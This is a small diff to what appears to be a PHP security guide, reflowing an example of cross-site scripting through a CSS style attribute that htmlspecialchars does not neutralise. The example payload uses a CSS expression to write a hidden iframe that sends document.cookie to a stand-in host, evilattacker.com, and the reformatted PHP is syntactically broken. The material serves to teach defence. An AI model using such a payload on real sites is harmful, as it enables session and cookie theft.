@@ -23,7 +23,9 @@ Now, I was very careless with the above example because I know some readers will
 
 .. code-block:: php
 
-    $colour = "expression(document.write('<iframe src=http://evilattacker.com?cookie=' + document.cookie.escape() + ' height=0 width=0 />'))";
+    $colour = "expression(document.write('<iframe src="
+        .= "http://evilattacker.com?cookie=' + document.cookie.escape() + "
+        .= "' height=0 width=0 />'))";
 
     <div style="background:<?php echo htmlspecialchars($colour, ENT_QUOTES, 'UTF-8') ?>;">
 
